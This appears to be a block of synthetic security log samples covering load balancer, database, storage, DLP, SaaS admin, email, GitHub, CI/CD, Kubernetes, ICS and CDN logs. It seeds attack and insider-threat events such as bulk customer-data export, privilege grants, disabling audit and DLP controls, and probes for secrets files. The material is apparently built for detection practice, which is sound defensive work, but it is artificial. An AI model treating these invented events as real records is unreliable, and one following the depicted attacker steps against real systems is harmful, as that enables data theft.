+2025-11-01T00:00:36Z lb client=185.227.70.204:49822 target=10.0.2.15:8080 req="GET /export" status=200 sent=411181 ua="python-requests"
+2025-11-01T00:00:49Z lb client=134.122.188.249:54001 target=10.0.2.16:8080 req="GET /admin" status=403 sent=421 ua="Mozilla"
+
+# 24. Application Structured Logs (your services)
+2025-11-01T00:00:12Z app service=orders level=INFO trace=9f3 user=rachel.hart action=checkout amount=499 status=OK
+2025-11-01T00:00:19Z app service=auth level=WARN trace=aa1 user=unknown action=login status=FAIL reason=BAD_PASSWORD ip=94.190.43.52
+2025-11-01T00:00:28Z app service=files level=INFO trace=bb2 user=jennifer.carson action=upload bytes=360440 status=OK
+2025-11-01T00:00:36Z app service=admin level=ERROR trace=cc3 user=william.brun action=export status=FAIL reason=TIMEOUT
+2025-11-01T00:00:49Z app service=payments level=WARN trace=dd4 user=harvey.seligman action=refund status=OK anomaly=RARE_GEO
+
+# 25. Service Mesh / Envoy Access Logs (microservices)
+2025-11-01T00:00:10Z envoy downstream=10.0.1.10 upstream_cluster=orders-v1 req="GET /health" code=200 bytes_out=120 dur_ms=2
+2025-11-01T00:00:16Z envoy downstream=10.0.1.10 upstream_cluster=auth-v1 req="POST /login" code=401 bytes_out=321 dur_ms=8
+2025-11-01T00:00:28Z envoy downstream=10.0.1.10 upstream_cluster=files-v1 req="POST /upload" code=200 bytes_out=360440 dur_ms=55
+2025-11-01T00:00:36Z envoy downstream=10.0.1.10 upstream_cluster=admin-v1 req="GET /export" code=200 bytes_out=411181 dur_ms=410
+2025-11-01T00:00:49Z envoy downstream=10.0.1.10 upstream_cluster=admin-v1 req="GET /export" code=429 bytes_out=98 dur_ms=1
+
+6) Data + Exfil Protection + SaaS (5 families × 5 lines)
+# 26. Database Audit Logs (Postgres/MySQL/MSSQL)
+2025-11-01T00:00:12Z db_audit db=prod user=appsvc ip=10.0.1.10 action=SELECT table=users rows=120 status=OK
+2025-11-01T00:00:19Z db_audit db=prod user=appsvc ip=10.0.1.10 action=SELECT table=customers rows=250000 status=OK anomaly=LARGE_EXPORT
+2025-11-01T00:00:28Z db_audit db=prod user=admin1 ip=185.227.70.204 action=ALTER role=appsvc grant=SUPERUSER status=OK
+2025-11-01T00:00:36Z db_audit db=prod user=unknown ip=94.190.43.52 action=LOGIN status=FAIL reason=BAD_PASSWORD
+2025-11-01T00:00:49Z db_audit db=prod user=appsvc ip=10.0.1.10 action=COPY_OUT table=customers bytes_out=411181 status=OK
+
+# 27. Object Storage Access Logs (S3/Blob/GCS)
+2025-11-01T00:00:10Z objstore bucket=prod-backups op=GET key=db.tgz requester=svc_backup ip=10.0.2.15 status=200 bytes=411181
+2025-11-01T00:00:16Z objstore bucket=prod-backups op=LIST requester=admin1 ip=185.227.70.204 status=200 objects=842
+2025-11-01T00:00:28Z objstore bucket=prod-data op=GET key=customers.csv requester=admin1 ip=185.227.70.204 status=200 bytes=360440
+2025-11-01T00:00:36Z objstore bucket=prod-data op=PUT key=dropper.bin requester=unknown ip=94.190.43.52 status=403 bytes=0
+2025-11-01T00:00:49Z objstore bucket=prod-data op=GET key=secrets.txt requester=unknown ip=208.81.37.55 status=403 bytes=0
+
+# 28. DLP / CASB Alerts (data movement control)
+2025-11-01T00:00:12Z dlp user=rachel.hart action=UPLOAD dest=personal_drive file="customers.csv" policy=PII severity=HIGH decision=BLOCK
+2025-11-01T00:00:19Z dlp user=harvey.seligman action=EMAIL_ATTACH dest=external file="payroll.xlsx" policy=FINANCE severity=CRITICAL decision=QUARANTINE
+2025-11-01T00:00:28Z dlp user=william.brun action=PRINT file="strategy.pdf" policy=CONFIDENTIAL severity=MED decision=ALLOW
+2025-11-01T00:00:36Z casb user=jennifer.carson action=OAUTH_GRANT app="UnknownApp" scopes="mail.read,files.read" risk=HIGH decision=REVOKE
+2025-11-01T00:00:49Z dlp user=admin1 action=DOWNLOAD dest=USB file="db.tgz" policy=RESTRICTED severity=CRITICAL decision=ALERT
+
+# 29. SaaS Admin Audit Logs (M365/Google/Slack admin actions)
+2025-11-01T00:00:10Z saas_admin system=M365 actor=admin1 action=DisableMailboxAudit target=org outcome=Success ip=185.227.70.204
+2025-11-01T00:00:16Z saas_admin system=GoogleWS actor=harvey.seligman action=AddForwarding target=rachel.hart dest="external@x.com" outcome=Success
+2025-11-01T00:00:28Z saas_admin system=Slack actor=admin1 action=ExportWorkspaceData target=workspace outcome=Success
+2025-11-01T00:00:36Z saas_admin system=M365 actor=admin1 action=CreateTransportRule target="bypass_dlp" outcome=Success
+2025-11-01T00:00:49Z saas_admin system=GoogleWS actor=unknown action=AdminLogin outcome=Fail ip=94.190.43.52
+
+# 30. Email Security Gateway Logs (phish/malware enforcement)
+2025-11-01T00:00:12Z email_sec from=payroll@itamaraty-gov.com to=jennifer.carson verdict=PHISH action=QUARANTINE urls=2
+2025-11-01T00:00:19Z email_sec from=it@company.com to=harvey.seligman verdict=CLEAN action=DELIVER urls=0
+2025-11-01T00:00:28Z email_sec from=alerts@cdn-update-check.net to=william.brun verdict=MALWARE action=DROP attach="invoice.exe"
+2025-11-01T00:00:36Z email_sec from=support@microsoft.com to=rachel.hart verdict=SPOOF action=QUARANTINE reason=DMARC_FAIL
+2025-11-01T00:00:49Z email_sec from=partner@vendor.com to=kenneth.dorsey verdict=CLEAN action=DELIVER urls=1
+
+7) DevOps + “Special environments” (5 families × 5 lines)
+# 31. GitHub Audit Logs (repo/org events)
+2025-11-01T00:00:10Z gh_audit actor=james.shipp action=repo.clone repo=org/proj ip=43.131.69.98
+2025-11-01T00:00:16Z gh_audit actor=admin1 action=org.add_member target=unknown ip=185.227.70.204
+2025-11-01T00:00:28Z gh_audit actor=jennifer.carson action=repo.add_secret name=AWS_KEY ip=77.73.133.73
+2025-11-01T00:00:36Z gh_audit actor=admin1 action=repo.disable_branch_protection repo=org/proj ip=185.227.70.204
+2025-11-01T00:00:49Z gh_audit actor=unknown action=org.oauth_app_authorize app=UnknownApp ip=94.190.43.52
+
+# 32. CI/CD Pipeline Logs (Jenkins/GitHub Actions)
+2025-11-01T00:00:10Z cicd pipeline=build-main actor=james.shipp stage=checkout result=OK
+2025-11-01T00:00:16Z cicd pipeline=build-main actor=james.shipp stage=tests result=FAIL reason="unit_test_timeout"
+2025-11-01T00:00:28Z cicd pipeline=release actor=admin1 stage=publish_artifact result=OK artifact="app.tar.gz"
+2025-11-01T00:00:36Z cicd pipeline=release actor=admin1 stage=deploy result=OK env=prod
+2025-11-01T00:00:49Z cicd pipeline=release actor=admin1 stage=disable_security_checks result=OK anomaly=HIGH
+
+# 33. Kubernetes Workload Events (kubelet / cluster events)
+2025-11-01T00:00:12Z k8s_event ns=prod pod=api-7c8 reason=Started msg="Started container api"
+2025-11-01T00:00:19Z k8s_event ns=prod pod=api-7c8 reason=Killing msg="OOMKilled"
+2025-11-01T00:00:28Z k8s_event ns=prod pod=debug-shell reason=Created msg="Created privileged pod"
+2025-11-01T00:00:36Z k8s_event ns=prod pod=api-7c8 reason=BackOff msg="Back-off restarting failed container"
+2025-11-01T00:00:49Z k8s_event ns=prod pod=api-7c8 reason=Started msg="Restarted container api"
+
+# 34. OT/ICS / SCADA Security Events (industrial networks)
+2025-11-01T00:00:10Z ics device=PLC-1 proto=MODBUS action=WRITE_REGISTER src=10.50.1.20 result=ALLOW
+2025-11-01T00:00:16Z ics device=PLC-1 proto=MODBUS action=WRITE_REGISTER src=208.81.37.55 result=BLOCK anomaly=EXTERNAL_SRC
+2025-11-01T00:00:28Z ics device=HMI-2 proto=DNP3 action=OPERATE_POINT src=10.50.1.33 result=ALLOW
+2025-11-01T00:00:36Z ics device=PLC-3 proto=S7COMM action=START_CPU src=10.50.1.99 result=ALLOW
+2025-11-01T00:00:49Z ics device=PLC-3 proto=S7COMM action=STOP_CPU src=10.50.1.99 result=BLOCK severity=CRITICAL
+
+# 35. CDN / Edge Security Logs (Cloudflare/Fastly/Akamai)
+2025-11-01T00:00:10Z edge client_ip=43.131.69.98 host=example.com uri="/products" status=200 cache=HIT waf=PASS
+2025-11-01T00:00:16Z edge client_ip=94.190.43.52 host=example.com uri="/.env" status=403 cache=MISS waf=BLOCK
+2025-11-01T00:00:28Z edge client_ip=208.81.37.55 host=example.com uri="/wp-admin/" status=403 cache=MISS bot=CHALLENGE
+2025-11-01T00:00:36Z edge client_ip=185.227.70.204 host=example.com uri="/export" status=200 bytes_out=411181 waf=PASS anomaly=LARGE
+2025-11-01T00:00:49Z edge client_ip=134.122.188.249 host=example.com uri="/api/login" status=429 ratelimit=TRIGGERED
+
